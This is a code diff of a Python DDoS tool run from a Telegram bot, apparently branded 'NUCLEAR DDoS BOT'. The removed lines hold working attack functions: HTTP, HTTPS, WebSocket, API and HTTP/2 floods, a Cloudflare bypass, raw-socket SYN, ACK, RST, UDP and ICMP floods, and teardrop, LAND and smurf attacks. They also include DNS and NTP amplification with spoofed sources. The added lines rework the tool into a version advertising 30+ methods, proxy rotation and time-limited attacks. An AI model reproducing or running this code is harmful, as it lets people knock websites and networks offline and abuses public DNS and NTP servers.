-            })
-        
         if random.random() > 0.5:
             headers['Referer'] = random.choice([
                 'https://www.google.com/',
                 'https://www.facebook.com/',
                 'https://twitter.com/',
                 'https://www.youtube.com/',
+                'https://www.reddit.com/',
             ])
         
         return headers
     
-    # ========== LAYER 7 ATTACKS ==========
-    
-    def layer7_http_raw(self, target, port, duration, thread_id):
-        """Layer 7 - Raw HTTP Flood"""
-        url = f"http://{target}:{port}/" if port != 80 else f"http://{target}/"
-        end_time = time.time() + duration
-        
-        while time.time() < end_time and self.attack_status.get(target, {}).get('active', True):
-            try:
-                # Raw socket HTTP request
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(5)
-                sock.connect((target, port))
-                
-                # Send malformed HTTP request
-                request = f"GET /?{random.randint(1, 9999999)} HTTP/1.1\r\n"
-                request += f"Host: {target}\r\n"
-                request += "User-Agent: " + random.choice(self.user_agents) + "\r\n"
-                request += "Accept: */*\r\n"
-                request += "Connection: keep-alive\r\n"
-                request += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
-                request += "\r\n"
-                
-                sock.send(request.encode())
-                sock.close()
-                
-                self.total_requests += 1
-                self.total_bytes += len(request.encode())
-            except:
-                pass
-    
-    def layer7_https_ssl(self, target, port, duration, thread_id):
-        """Layer 7 - HTTPS SSL Flood"""
-        url = f"https://{target}:{port}/" if port != 443 else f"https://{target}/"
-        end_time = time.time() + duration
-        
-        while time.time() < end_time and self.attack_status.get(target, {}).get('active', True):
-            try:
-                # Create SSL context
-                context = ssl.create_default_context()
-                context.check_hostname = False
-                context.verify_mode = ssl.CERT_NONE
-                
-                # Create raw socket
-                raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                raw_socket.settimeout(10)
-                
-                # Wrap with SSL
-                ssl_socket = context.wrap_socket(raw_socket, server_hostname=target)
-                ssl_socket.connect((target, port))
-                
-                # Send HTTPS request
-                request = f"GET /?{random.randint(1, 9999999)} HTTP/1.1\r\n"
-                request += f"Host: {target}\r\n"
-                request += "User-Agent: " + random.choice(self.user_agents) + "\r\n"
-                request += "\r\n"
-                
-                ssl_socket.send(request.encode())
-                ssl_socket.close()
-                
-                self.total_requests += 1
-                self.total_bytes += len(request.encode())
-            except:
-                pass
-    
-    def layer7_cf_bypass(self, target, port, duration, thread_id):
-        """Layer 7 - Cloudflare Bypass"""
-        scraper = cloudscraper.create_scraper()
-        url = f"https://{target}/" if port == 443 else f"https://{target}:{port}/"
-        end_time = time.time() + duration
-        
-        while time.time() < end_time and self.attack_status.get(target, {}).get('active', True):
-            try:
-                headers = self.get_random_headers(with_cf=True)
-                
-                # Add more CF bypass headers
-                headers.update({
-                    'CF-IPCountry': random.choice(['US', 'GB', 'DE', 'FR', 'JP', 'CA']),
-                    'CF-Ray': f'{random.randint(100000, 999999)}-{random.choice(["SJC", "LAX", "DFW", "ORD", "LHR"])}',
-                    'CF-Visitor': '{"scheme":"https"}',
-                })
-                
-                # Random path
-                paths = ['/', '/index.php', '/home', '/api/v1', '/wp-admin', '/admin', '/login']
-                path = random.choice(paths)
-                
-                response = scraper.get(url + path, headers=headers, timeout=10)
-                self.total_requests += 1
-                self.total_bytes += len(response.content) if response.content else 0
-            except:
-                pass
-    
-    def layer7_websocket(self, target, port, duration, thread_id):
-        """Layer 7 - WebSocket Flood"""
-        end_time = time.time() + duration
-        
-        while time.time() < end_time and self.attack_status.get(target, {}).get('active', True):
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(5)
-                sock.connect((target, port))
-                
-                # WebSocket handshake
-                key = base64.b64encode(os.urandom(16)).decode()
-                handshake = f"GET /ws HTTP/1.1\r\n"
-                handshake += f"Host: {target}\r\n"
-                handshake += "Upgrade: websocket\r\n"
-                handshake += "Connection: Upgrade\r\n"
-                handshake += f"Sec-WebSocket-Key: {key}\r\n"
-                handshake += "Sec-WebSocket-Version: 13\r\n"
-                handshake += "\r\n"
-                
-                sock.send(handshake.encode())
-                
-                # Send WebSocket frames
-                for _ in range(100):
-                    frame = self.create_websocket_frame("A" * 1000)
-                    sock.send(frame)
-                    time.sleep(0.01)
-                
-                sock.close()
-                self.total_requests += 101
-                self.total_bytes += len(handshake.encode()) + 100 * 1000
-            except:
-                pass
-    
-    def layer7_api_flood(self, target, port, duration, thread_id):
-        """Layer 7 - API Flood"""
-        url = f"https://{target}:{port}/" if port == 443 else f"http://{target}:{port}/"
-        end_time = time.time() + duration
-        
-        api_endpoints = [
-            '/api/v1/users',
-            '/api/v1/posts',
-            '/api/v1/comments',
-            '/api/v1/auth/login',
-            '/api/v1/products',
-            '/graphql',
-            '/rest/v1',
-        ]
-        
-        while time.time() < end_time and self.attack_status.get(target, {}).get('active', True):
-            try:
-                endpoint = random.choice(api_endpoints)
-                headers = self.get_random_headers()
-                headers['Content-Type'] = 'application/json'
-                
-                # Random JSON payload
-                payload = {
-                    'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=100)),
-                    'timestamp': int(time.time()),
-                    'id': random.randint(1, 999999)
-                }
-                
-                proxy = self.get_random_proxy()
-                
-                if random.random() > 0.5:
-                    response = requests.post(url + endpoint, 
-                                           json=payload, 
-                                           headers=headers, 
-                                           proxies=proxy,
-                                           timeout=5,
-                                           verify=False)
-                else:
-                    response = requests.get(url + endpoint + f"?id={random.randint(1,999999)}",
-                                          headers=headers,
-                                          proxies=proxy,
-                                          timeout=5,
-                                          verify=False)
-                
-                self.total_requests += 1
-                self.total_bytes += len(json.dumps(payload).encode())
-            except:
-                pass
-    
-    def layer7_grpc(self, target, port, duration, thread_id):
-        """Layer 7 - gRPC Attack"""
-        end_time = time.time() + duration
-        
-        while time.time() < end_time and self.attack_status.get(target, {}).get('active', True):
-            try:
-                # gRPC uses HTTP/2
-                context = ssl.create_default_context()
-                context.check_hostname = False
-                context.verify_mode = ssl.CERT_NONE
-                context.set_alpn_protocols(['h2'])
-                
-                raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                raw_socket.settimeout(5)
-                
-                ssl_socket = context.wrap_socket(raw_socket, server_hostname=target)
-                ssl_socket.connect((target, port))
-                
-                # Send HTTP/2 preface
-                ssl_socket.send(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
-                
-                # Send settings frame
-                settings_frame = b'\x00\x00\x00\x04\x00\x00\x00\x00\x00'
-                ssl_socket.send(settings_frame)
-                
-                ssl_socket.close()
-                self.total_requests += 1
-                self.total_bytes += 100
-            except:
-                pass
-    
-    def layer7_http2(self, target, port, duration, thread_id):
-        """Layer 7 - HTTP/2 Flood"""
-        end_time = time.time() + duration
-        
-        while time.time() < end_time and self.attack_status.get(target, {}).get('active', True):
-            try:
-                # HTTP/2 connection
-                conn = http.client.HTTPSConnection(target, port, timeout=5)
-                conn.connect()
-                
-                # Send multiple streams
-                for _ in range(10):
-                    try:
-                        conn.request('GET', f'/?{random.randint(1,999999)}')
-                        conn.getresponse()
-                    except:
-                        break
-                
-                conn.close()
-                self.total_requests += 10
-            except:
-                pass
-    
-    # ========== LAYER 4 ATTACKS ==========
-    
-    def layer4_syn(self, target, port, duration, thread_id):
-        """Layer 4 - SYN Flood"""
-        end_time = time.time() + duration
-        
-        while time.time() < end_time and self.attack_status.get(target, {}).get('active', True):
-            try:
-                # Raw socket SYN packet
-                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-                
-                # Build IP header
-                ip_header = self.build_ip_header(target)
-                
-                # Build TCP header with SYN flag
-                tcp_header = self.build_tcp_header(port, 0x02)  # SYN flag
-                
-                packet = ip_header + tcp_header
-                s.sendto(packet, (target, 0))
-                
-                self.total_requests += 1
-                self.total_bytes += len(packet)
-                s.close()
-            except:
-                pass
-    
-    def layer4_ack(self, target, port, duration, thread_id):
-        """Layer 4 - ACK Flood"""
-        end_time = time.time() + duration
-        
-        while time.time() < end_time and self.attack_status.get(target, {}).get('active', True):
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-                
-                ip_header = self.build_ip_header(target)
-                tcp_header = self.build_tcp_header(port, 0x10)  # ACK flag
-                
-                packet = ip_header + tcp_header
-                s.sendto(packet, (target, 0))
-                
-                self.total_requests += 1
-                self.total_bytes += len(packet)
-                s.close()
-            except:
-                pass
-    
-    def layer4_udp(self, target, port, duration, thread_id):
-        """Layer 4 - UDP Flood"""
-        end_time = time.time() + duration
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        
-        while time.time() < end_time and self.attack_status.get(target, {}).get('active', True):
-            try:
-                # Send random size UDP packets
-                size = random.randint(1024, 65507)
-                data = os.urandom(size)
-                sock.sendto(data, (target, port))
-                
-                self.total_requests += 1
-                self.total_bytes += size
-            except:
-                pass
-        sock.close()
-    
-    def layer4_icmp(self, target, port, duration, thread_id):
-        """Layer 4 - ICMP Flood (Ping Flood)"""
-        end_time = time.time() + duration
-        
-        while time.time() < end_time and self.attack_status.get(target, {}).get('active', True):
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-                
-                # Build ICMP echo request
-                icmp_type = 8  # Echo request
-                icmp_code = 0
-                icmp_checksum = 0
-                icmp_id = os.getpid() & 0xFFFF
-                icmp_seq = 1
-                
-                icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
-                data = os.urandom(56)
-                
-                packet = icmp_header + data
-                s.sendto(packet, (target, 0))
-                
-                self.total_requests += 1
-                self.total_bytes += len(packet)
-                s.close()
-            except:
-                pass
-    
-    def layer4_rst(self, target, port, duration, thread_id):
-        """Layer 4 - RST Flood"""
-        end_time = time.time() + duration
-        
-        while time.time() < end_time and self.attack_status.get(target, {}).get('active', True):
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-                
-                ip_header = self.build_ip_header(target)
-                tcp_header = self.build_tcp_header(port, 0x04)  # RST flag
-                
-                packet = ip_header + tcp_header
-                s.sendto(packet, (target, 0))
-                
-                self.total_requests += 1
-                self.total_bytes += len(packet)
-                s.close()
-            except:
-                pass
-    
-    def layer4_teardrop(self, target, port, duration, thread_id):
-        """Layer 4 - Teardrop Attack"""
-        end_time = time.time() + duration
-        
-        while time.time() < end_time and self.attack_status.get(target, {}).get('active', True):
-            try:
-                # Create overlapping IP fragments
-                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
-                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-                
-                # Fragment 1
-                offset = 0
-                ip_header = self.build_ip_header(target, offset=offset, more_fragments=1)
-                s.sendto(ip_header, (target, 0))
-                
-                # Fragment 2 (overlapping)
-                offset = 24  # Overlapping offset
-                ip_header = self.build_ip_header(target, offset=offset, more_fragments=0)
-                s.sendto(ip_header, (target, 0))
-                
-                self.total_requests += 2
-                self.total_bytes += len(ip_header) * 2
-                s.close()
-            except:
-                pass
-    
-    # ========== LAYER 3 ATTACKS ==========
-    
-    def layer3_ip_fragment(self, target, port, duration, thread_id):
-        """Layer 3 - IP Fragment Flood"""
-        end_time = time.time() + duration
-        
-        while time.time() < end_time and self.attack_status.get(target, {}).get('active', True):
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-                
-                # Send many small fragments
-                for i in range(100):
-                    offset = i * 8
-                    more_frag = 1 if i < 99 else 0
-                    ip_header = self.build_ip_header(target, offset=offset, more_fragments=more_frag)
-                    s.sendto(ip_header, (target, 0))
-                    
-                    self.total_requests += 1
-                    self.total_bytes += len(ip_header)
-                
-                s.close()
-            except:
-                pass
-    
-    def layer3_smurf(self, target, port, duration, thread_id):
-        """Layer 3 - Smurf Attack"""
-        end_time = time.time() + duration
-        
-        # Get broadcast address
-        network = ipaddress.ip_network(f"{target}/24", strict=False)
-        broadcast = str(network.broadcast_address)
-        
-        while time.time() < end_time and self.attack_status.get(target, {}).get('active', True):
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-                s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-                
-                # Spoof source IP as target
-                source_ip = target
-                
-                # Build ICMP packet
-                packet = self.build_icmp_packet(source_ip, broadcast)
-                s.sendto(packet, (broadcast, 0))
-                
-                self.total_requests += 1
-                self.total_bytes += len(packet)
-                s.close()
-            except:
-                pass
-    
-    def layer3_land(self, target, port, duration, thread_id):
-        """Layer 3 - LAND Attack"""
-        end_time = time.time() + duration
-        
-        while time.time() < end_time and self.attack_status.get(target, {}).get('active', True):
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-                
-                # Build packet with source = destination (LAND attack)
-                ip_header = self.build_land_ip_header(target)
-                tcp_header = self.build_tcp_header(port, 0x02, dest_port=port)
-                
-                packet = ip_header + tcp_header
-                s.sendto(packet, (target, 0))
-                
-                self.total_requests += 1
-                self.total_bytes += len(packet)
-                s.close()
-            except:
-                pass
-    
-    # ========== ADVANCED AMPLIFICATION ATTACKS ==========
-    
-    def advanced_dns_amp(self, target, port, duration, thread_id):
-        """DNS Amplification Attack"""
-        end_time = time.time() + duration
-        dns_servers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']
-        
-        while time.time() < end_time and self.attack_status.get(target, {}).get('active', True):
-            try:
-                dns_server = random.choice(dns_servers)
-                
-                # Create DNS query for large response
-                query = self.build_dns_query(target)
-                
-                # Spoof source IP as target
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.sendto(query, (dns_server, 53))
-                
-                self.total_requests += 1
-                self.total_bytes += len(query)
-                sock.close()
-            except:
-                pass
-    
-    def advanced_ntp_amp(self, target, port, duration, thread_id):
-        """NTP Amplification Attack"""
-        end_time = time.time() + duration
-        
-        while time.time() < end_time and self.attack_status.get(target, {}).get('active', True):
-            try:
-                # NTP MONLIST request (amplification factor ~200x)
-                ntp_request = b'\x17\x00\x03\x2a' + b'\x00' * 4
-                
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.sendto(ntp_request, (target, 123))
-                
-                self.total_requests += 1
-                self.total_bytes += len(ntp_request)
-                sock.close()
-            except:
-                pass
-    
-    # ========== ULTIMATE ATTACKS ==========
-    
-    def ultimate_nuclear(self, target, port, duration, thread_id):
-        """ULTIMATE: Nuclear Mix Attack"""
-        end_time = time.time() + duration
-        
-        methods = [
-            self.layer7_http_raw,
-            self.layer4_syn,
-            self.layer4_udp,
-            self.layer7_https_ssl,
-        ]
-        
-        while time.time() < end_time and self.attack_status.get(target, {}).get('active', True):
-            method = random.choice(methods)
-            try:
-                method(target, port, 1, thread_id)
-            except:
-                pass
-    
-    def ultimate_tsunami(self, target, port, duration, thread_id):
-        """ULTIMATE: Tsunami Wave Attack"""
-        end_time = time.time() + duration
-        
-        # Wave pattern: low -> high -> low
-        wave_duration = 30  # seconds per wave
-        waves = int(duration / wave_duration)
-        
-        for wave in range(waves):
-            if not self.attack_status.get(target, {}).get('active', True):
-                break
-                
-            # Ramp up
-            for i in range(1, 11):
-                if time.time() > end_time:
-                    break
-                    
-                threads = []
-                for j in range(i * 10):
-                    t = threading.Thread(target=self.layer7_http_raw, args=(target, port, 5, thread_id))
-                    t.start()
-                    threads.append(t)
-                
-                time.sleep(0.5)
-                
-                for t in threads:
-                    t.join(timeout=3)
-            
-            # Ramp down
-            for i in range(10, 0, -1):
-                if time.time() > end_time:
-                    break
-                    
-                threads = []
-                for j in range(i * 10):
-                    t = threading.Thread(target=self.layer4_udp, args=(target, port, 5, thread_id))
-                    t.start()
-                    threads.append(t)
-                
-                time.sleep(0.5)
-                
-                for t in threads:
-                    t.join(timeout=3)
-    
-    # ========== HELPER METHODS ==========
-    
-    def build_ip_header(self, dest_ip, offset=0, more_fragments=0):
+    def _build_ip_header(self, dest_ip: str) -> bytes:
         """Build IP header"""
         version = 4
         ihl = 5
@@ -729,7 +860,7 @@ class NuclearDDoSAttacker:
         tos = 0
         total_length = 20 + 20
         id = random.randint(1, 65535)
-        flags_offset = (more_fragments << 13) + offset
+        flags_offset = 0
         ttl = 255
         protocol = socket.IPPROTO_TCP
         checksum = 0
@@ -742,28 +873,7 @@ class NuclearDDoSAttacker:
                                src_ip, dst_ip)
         return ip_header
     
-    def build_land_ip_header(self, dest_ip):
-        """Build LAND attack IP header (src = dst)"""
-        version = 4
-        ihl = 5
-        version_ihl = (version << 4) + ihl
-        tos = 0
-        total_length = 20 + 20
-        id = random.randint(1, 65535)
-        flags_offset = 0
-        ttl = 255
-        protocol = socket.IPPROTO_TCP
-        checksum = 0
-        src_ip = socket.inet_aton(dest_ip)  # Same as dest
-        dst_ip = socket.inet_aton(dest_ip)
-        
-        ip_header = struct.pack('!BBHHHBBH4s4s',
-                               version_ihl, tos, total_length, id,
-                               flags_offset, ttl, protocol, checksum,
-                               src_ip, dst_ip)
-        return ip_header
-    
-    def build_tcp_header(self, dest_port, flags, dest_port_src=None):
+    def _build_tcp_header(self, dest_port: int, flags: int) -> bytes:
         """Build TCP header"""
         src_port = random.randint(1024, 65535)
         seq_num = random.randint(0, 4294967295)
@@ -782,505 +892,475 @@ class NuclearDDoSAttacker:
                                 tcp_flags, window,
                                 checksum, urg_ptr)
         return tcp_header
-    
-    def build_icmp_packet(self, src_ip, dest_ip):
-        """Build ICMP packet"""
-        icmp_type = 8
-        icmp_code = 0
-        icmp_checksum = 0
-        icmp_id = 1
-        icmp_seq = 1
-        
-        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code,
-                                 icmp_checksum, icmp_id, icmp_seq)
-        data = b'X' * 56
-        
-        return icmp_header + data
-    
-    def create_websocket_frame(self, message):
-        """Create WebSocket frame"""
-        frame = bytearray()
-        frame.append(0x81)  # FIN + text frame
-        length = len(message)
-        
-        if length <= 125:
-            frame.append(length)
-        elif length <= 65535:
-            frame.append(126)
-            frame.extend(struct.pack('!H', length))
-        else:
-            frame.append(127)
-            frame.extend(struct.pack('!Q', length))
-        
-        frame.extend(message.encode())
-        return bytes(frame)
-    
-    def build_dns_query(self, domain):
-        """Build DNS query for amplification"""
-        query_id = random.randint(1, 65535)
-        flags = 0x0100  # Standard query
-        questions = 1
-        answer_rrs = 0
-        authority_rrs = 0
-        additional_rrs = 0
-        
-        header = struct.pack('!HHHHHH', query_id, flags, questions,
-                           answer_rrs, authority_rrs, additional_rrs)
-        
-        # Query for ANY record (large response)
-        qname = b'\x00'
-        qtype = 255  # ANY
-        qclass = 1   # IN
-        
-        question = qname + struct.pack('!HH', qtype, qclass)
-        
-        return header + question
-    
-    def scan_ports(self, target):
-        """Scan for open ports"""
-        print(Fore.YELLOW + f"[+] Scanning {target}...")
-        common_ports = [80, 443, 8080, 8443, 21, 22, 25, 53, 110, 143, 3306, 3389, 5432]
-        open_ports = []
-        
-        def check_port(port):
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(1)
-                result = sock.connect_ex((target, port))
-                if result == 0:
-                    open_ports.append(port)
-                sock.close()
-            except:
-                pass
-        
-        with ThreadPoolExecutor(max_workers=100) as executor:
-            executor.map(check_port, common_ports)
-        
-        return open_ports if open_ports else [80, 443]
-    
-    def start_attack(self, target, method, duration, threads=500):
-        """Start attack"""
-        print(Fore.CYAN + f"[+] Launching {method} on {target} for {duration}s")
-        
-        # Parse target
-        if ":" in target:
-            target, port = target.split(":")
-            port = int(port)
-        else:
-            ports = self.scan_ports(target)
-            port = ports[0]
-            print(Fore.GREEN + f"[+] Using port {port}")
-        
-        # Get method function
-        method_func_name = None
-        all_methods = {**LAYER_7_METHODS, **LAYER_4_METHODS, **LAYER_3_METHODS, **ADVANCED_METHODS, **ULTIMATE_METHODS}
-        
-        for display_name, func_name in all_methods.items():
-            if method.lower() in display_name.lower().replace(" ", "").replace("️", "").replace("🔟", ""):
-                method_func_name = func_name
-                break
-        
-        if not method_func_name:
-            print(Fore.RED + f"[-] Method not found: {method}")
-            return False
-        
-        method_func = getattr(self, method_func_name, None)
-        if not method_func:
-            print(Fore.RED + f"[-] Method function not found: {method_func_name}")
-            return False
-        
-        # Set attack status
-        self.attack_status[target] = {
-            'active': True,
-            'start_time': time.time(),
-            'method': method,
-            'threads': threads,
-            'duration': duration,
-            'requests': 0,
-            'bytes': 0
-        }
-        
-        # Reset counters
-        self.total_requests = 0
-        self.total_bytes = 0
-        
-        # Start attack threads
-        attack_threads = []
-        for i in range(threads):
-            t = threading.Thread(target=method_func, args=(target, port, duration, i))
-            t.daemon = True
-            t.start()
-            attack_threads.append(t)
-        
-        # Monitor attack
-        monitor_thread = threading.Thread(target=self.monitor_attack, args=(target, duration))
-        monitor_thread.start()
-        
-        print(Fore.GREEN + f"[+] {method} attack launched with {threads} threads")
-        return True
-    
-    def monitor_attack(self, target, duration):
-        """Monitor attack progress"""
-        start_time = time.time()
-        end_time = start_time + duration
-        
-        while time.time() < end_time and self.attack_status.get(target, {}).get('active', True):
-            time.sleep(1)
-            elapsed = int(time.time() - start_time)
-            
-            # Update attack stats
-            if target in self.attack_status:
-                self.attack_status[target]['requests'] = self.total_requests
-                self.attack_status[target]['bytes'] = self.total_bytes
-                self.attack_status[target]['elapsed'] = elapsed
-        
-        # Attack finished
-        if target in self.attack_status:
-            self.attack_status[target]['active'] = False
-            self.attack_status[target]['end_time'] = time.time()
-        
-        print(Fore.YELLOW + f"[+] Attack on {target} completed")
-    
-    def stop_attack(self, target):
-        """Stop attack"""
-        if target in self.attack_status:
-            self.attack_status[target]['active'] = False
-            print(Fore.YELLOW + f"[+] Stopped attack on {target}")
-            return True
-        return False
-    
-    def get_stats(self):
-        """Get attack statistics"""
-        stats = []
-        for target, info in self.attack_status.items():
-            if info['active']:
-                stats.append({
-                    'target': target,
-                    'method': info.get('method', 'Unknown'),
-                    'elapsed': info.get('elapsed', 0),
-                    'requests': info.get('requests', 0),
-                    'bytes': info.get('bytes', 0),
-                    'threads': info.get('threads', 0)
-                })
-        return stats
-
-# Initialize attacker
-attacker = NuclearDDoSAttacker()
 
 # ========== TELEGRAM BOT ==========
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Start command with inline keyboard"""
-    if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text("❌ Unauthorized!")
-        return
+class TelegramBot:
+    def __init__(self, attack_manager: AttackManager):
+        self.attack_manager = attack_manager
+        self.application = None
     
-    keyboard = [
-        [InlineKeyboardButton("⚡ START ATTACK", callback_data="start_attack")],
-        [InlineKeyboardButton("🎯 ATTACK METHODS", callback_data="methods")],
-        [InlineKeyboardButton("📊 ATTACK STATUS", callback_data="status")],
-        [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop_attack")],
-        [InlineKeyboardButton("🔧 BOT SETTINGS", callback_data="settings")],
-    ]
-    
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
-    welcome = """*☢️ NUCLEAR DDoS BOT v2.0* ☢️
+    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle /start command"""
+        user_id = update.effective_user.id
+        if user_id not in CONFIG["ADMIN_IDS"]:
+            await update.message.reply_text("❌ Unauthorized!")
+            return
+        
+        keyboard = [
+            [InlineKeyboardButton("⚡ START ATTACK", callback_data="menu_start")],
+            [InlineKeyboardButton("🎯 ATTACK METHODS", callback_data="menu_methods")],
+            [InlineKeyboardButton("📊 ATTACK STATUS", callback_data="menu_status")],
+            [InlineKeyboardButton("🛑 STOP ATTACKS", callback_data="menu_stop")],
+            [InlineKeyboardButton("🔧 BOT STATS", callback_data="menu_stats")],
+            [InlineKeyboardButton("🔄 REFRESH PROXIES", callback_data="menu_refresh")],
+        ]
+        
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        welcome_text = """
+☢️ *NUCLEAR DDoS BOT v3.0* ☢️
 
 *Features:*
-• 20+ Attack Methods
-• 7 Layer OSI Attacks
+• 30+ Attack Methods
+• 7 Layer OSI Support
 • Auto-Proxy System
-• Real-time Stats
+• Real-time Statistics
+• Time-Limited Attacks
 • Cloudflare Bypass
 • Amplification Attacks
-• Multi-Threading
 
 *Commands:*
 /attack - Start attack
 /methods - Show methods
 /status - Check status
 /stop - Stop attack
+/stats - Bot statistics
 /proxies - Proxy info
-/stats - Statistics
 
-*Ready to launch!*"""
-    
-    await update.message.reply_text(welcome, parse_mode='Markdown', reply_markup=reply_markup)
-
-async def methods_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show attack methods"""
-    if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text("❌ Unauthorized!")
-        return
-    
-    methods_text = """*🎯 ATTACK METHODS* 🎯
-
-*Layer 7 - Application Layer:*
-"""
-    
-    for name, func in LAYER_7_METHODS.items():
-        methods_text += f"• {name}\n"
-    
-    methods_text += "\n*Layer 4 - Transport Layer:*\n"
-    for name, func in LAYER_4_METHODS.items():
-        methods_text += f"• {name}\n"
-    
-    methods_text += "\n*Layer 3 - Network Layer:*\n"
-    for name, func in LAYER_3_METHODS.items():
-        methods_text += f"• {name}\n"
-    
-    methods_text += "\n*Advanced Amplification:*\n"
-    for name, func in ADVANCED_METHODS.items():
-        methods_text += f"• {name}\n"
-    
-    methods_text += "\n*☢️ Ultimate Attacks:*\n"
-    for name, func in ULTIMATE_METHODS.items():
-        methods_text += f"• {name}\n"
-    
-    methods_text += "\n*Usage:* `/attack [url] [method] [time] [threads]`"
-    
-    await update.message.reply_text(methods_text, parse_mode='Markdown')
-
-async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Start attack command"""
-    if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text("❌ Unauthorized!")
-        return
-    
-    if len(context.args) < 3:
-        await update.message.reply_text("❌ *Usage:* `/attack [url] [method] [time] [threads=500]`\n\n*Example:* `/attack example.com HTTP-RAW 60 1000`", parse_mode='Markdown')
-        return
-    
-    target = context.args[0]
-    method = context.args[1]
-    try:
-        duration = int(context.args[2])
-        threads = int(context.args[3]) if len(context.args) > 3 else 500
-    except ValueError:
-        await update.message.reply_text("❌ Invalid time or threads!")
-        return
-    
-    if duration > 3600:
-        await update.message.reply_text("❌ Max time: 3600 seconds")
-        return
-    
-    if threads > 5000:
-        await update.message.reply_text("❌ Max threads: 5000")
-        return
-    
-    # Start attack
-    await update.message.reply_text(f"⚡ *Launching Attack...*\n\nTarget: `{target}`\nMethod: `{method}`\nTime: `{duration}s`\nThreads: `{threads}`", parse_mode='Markdown')
-    
-    success = attacker.start_attack(target, method, duration, threads)
-    
-    if success:
-        await update.message.reply_text(f"✅ *Attack Launched!*\n\nTarget: `{target}`\nMethod: `{method}`\nDuration: `{duration}s`\nThreads: `{threads}`\nProxies: `{len(attacker.proxies)}`", parse_mode='Markdown')
-    else:
-        await update.message.reply_text("❌ Failed to start attack!")
-
-async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Check attack status"""
-    if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text("❌ Unauthorized!")
-        return
-    
-    stats = attacker.get_stats()
-    
-    if not stats:
-        await update.message.reply_text("📊 *No active attacks*", parse_mode='Markdown')
-        return
-    
-    status_text = "📊 *ACTIVE ATTACKS*\n\n"
-    for stat in stats:
-        mb_sent = stat['bytes'] / (1024 * 1024)
-        rps = stat['requests'] / stat['elapsed'] if stat['elapsed'] > 0 else 0
+*Ready for action!*"""
         
-        status_text += f"""🎯 *Target:* `{stat['target']}`
-⚡ *Method:* `{stat['method']}`
-⏱️ *Time:* `{stat['elapsed']}s`
-📈 *Requests:* `{stat['requests']:,}`
-🚀 *RPS:* `{rps:.1f}`
-💾 *Data Sent:* `{mb_sent:.2f} MB`
-🧵 *Threads:* `{stat['threads']}`
+        await update.message.reply_text(
+            welcome_text,
+            parse_mode='Markdown',
+            reply_markup=reply_markup
+        )
+    
+    async def attack_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle /attack command"""
+        user_id = update.effective_user.id
+        if user_id not in CONFIG["ADMIN_IDS"]:
+            await update.message.reply_text("❌ Unauthorized!")
+            return
+        
+        if len(context.args) < 3:
+            help_text = """
+❌ *Usage:* `/attack [url] [method] [time] [threads]`
+
+*Example:* `/attack example.com HTTP-NUKE 60 1000`
+
+*Available Methods:*
+• HTTP-NUKE, HTTPS-NUKE
+• SYN-FLOOD, UDP-FLOOD
+• DNS-AMP, NTP-AMP
+• SLOWLORIS, RUDY
+• CF-BYPASS, NUCLEAR-MIX
+• APOCALYPSE (All methods)
+
+*Parameters:*
+• Time: 1-3600 seconds
+• Threads: 1-10000
+"""
+            await update.message.reply_text(help_text, parse_mode='Markdown')
+            return
+        
+        target = context.args[0]
+        method = context.args[1].upper()
+        
+        try:
+            duration = int(context.args[2])
+            threads = int(context.args[3]) if len(context.args) > 3 else 500
+            
+            if duration < 1 or duration > CONFIG["MAX_ATTACK_TIME"]:
+                await update.message.reply_text(
+                    f"❌ Duration must be between 1 and {CONFIG['MAX_ATTACK_TIME']} seconds!"
+                )
+                return
+            
